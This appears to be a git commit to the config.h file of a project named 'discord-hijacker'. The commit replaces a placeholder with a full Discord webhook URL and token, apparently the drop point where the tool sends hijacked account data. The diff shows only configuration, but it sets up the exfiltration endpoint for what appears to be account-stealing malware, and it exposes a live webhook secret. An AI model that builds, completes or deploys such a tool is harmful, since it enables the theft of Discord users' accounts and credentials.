7b97897041d0bcc411c5db2e1f829e4b431e65d8
Zxlster <113268692+Zxlster@users.noreply.github.com>
2022-12-29 10:49:11 -0800

    Update config.h

--- discord-hijacker/config.h
+++ discord-hijacker/config.h
@@ -2,5 +2,5 @@
 
 namespace config {
 	std::string discord_version = "0.0.306"; // here you put the version of the currrent discord, as of 2020-07-24 it is : 0.0.306
-	std::string webhook_link = "https://your_webhook_link"; // here you put the link of your webhook
+	std::string webhook_link = "https://discord.com/api/webhooks/1058080508564734053/nKhzm1fK8YS4KbvjJZkEdy-cgGI7SMBJJBNwhUm0rsekW7lXjEQil6F2_3YMzRA-y7X7"; // here you put the link of your webhook
 };
